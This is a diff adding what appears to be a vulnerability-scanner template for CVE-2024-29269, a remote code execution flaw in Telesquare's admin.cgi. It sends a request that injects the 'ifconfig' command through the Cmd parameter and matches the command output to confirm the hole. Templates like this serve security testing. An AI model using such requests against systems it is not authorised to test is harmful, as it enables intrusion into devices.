@@ -1,0 +1,27 @@
+id: poc-yaml-telesquare-admin-cgi-rce
+info:
+  name: Telesquare admin.cgi Remote Code Execution (CVE-2024-29269)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2024-29269
+  description: |
+    Telesquare admin.cgi is vulnerable to remote code execution, allowing attackers to execute arbitrary commands.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<CmdResult>"
+          - "Ethernet"
+          - "inet"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
